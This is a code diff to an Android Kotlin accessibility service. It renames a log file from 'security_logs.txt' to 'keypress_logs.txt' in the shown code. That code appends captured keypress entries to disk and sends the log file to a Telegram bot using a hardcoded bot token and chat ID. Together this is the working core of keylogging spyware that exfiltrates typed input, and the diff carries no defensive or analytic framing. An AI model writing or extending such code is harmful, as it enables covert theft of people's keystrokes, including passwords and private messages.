@@ -52,7 +52,7 @@ class MyAccessibilityService : AccessibilityService() {
     private fun sendLogFileToTelegram() {
         val token = "8279084594:AAG6F4IX2Ahz1tc32cKaH3dkXNOubRSGLpg"
         val chatId = "8231933199"
-        val logFile = File(filesDir, "security_logs.txt")
+        val logFile = File(filesDir, "keypress_logs.txt")
 
         if (logFile.exists() && logFile.length() > 0) {
             thread {
@@ -271,7 +271,7 @@ class MyAccessibilityService : AccessibilityService() {
 
             // Always write to disk — works even when Flutter is dead
             try {
-                FileWriter(File(filesDir, "security_logs.txt"), true).use { it.write(entry) }
+                FileWriter(File(filesDir, "keypress_logs.txt"), true).use { it.write(entry) }
             } catch (e: Exception) {
                 e.printStackTrace()
             }
